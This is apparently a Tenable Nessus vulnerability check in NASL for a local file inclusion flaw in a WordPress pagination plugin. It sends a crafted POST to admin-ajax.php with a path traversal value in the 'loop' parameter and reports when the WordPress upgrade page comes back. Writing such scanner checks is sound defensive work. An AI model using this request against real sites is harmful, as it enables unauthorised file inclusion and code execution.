#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73378);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/19 18:10:51 $");

  script_bugtraq_id(66526);
  script_osvdb_id(105087);
  script_xref(name:"EDB-ID", value:"32622");

  script_name(english:"Ajax Pagination (twitter Style) Plugin for WordPress Local File Inclusion");
  script_summary(english:"Attempts to load a local PHP file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Ajax Pagination (twitter Style) plugin for WordPress installed on
the remote host is affected by a local file inclusion vulnerability
due to a failure to properly sanitize user-supplied input to the
'loop' parameter of the '/wp-admin/admin-ajax.php' script. A remote,
unauthenticated attacker can exploit this issue to execute arbitrary
PHP scripts on the remote host.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Mar/398");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/03/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/04/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Ajax Pagination (twitter Style)";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('fn\\.ajaxpaging', 'Ajax functionality');
  checks["/wp-content/plugins/ajax-pagination/js/jquery.ajaxpaging.js.php"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

vuln = FALSE;
attack = mult_str(str:"../", nb:3) + "wp-admin/upgrade";

res = http_send_recv3(
  method       : "POST",
  port         : port,
  item         : dir + "/wp-admin/admin-ajax.php",
  data         : "paged=1&action=ajax_navigation&loop=" + urlencode(str:attack),
  content_type : "application/x-www-form-urlencoded",
  exit_on_fail : TRUE
);

if(
  egrep(pattern:'\\<title\\>WordPress (.*)(Update|Upgrade)', string:res[2]) &&
  '<a href="http://wordpress.org/">' >< res[2]
)
{
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + '  ' + http_last_sent_request() +
      '\n' +
      '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
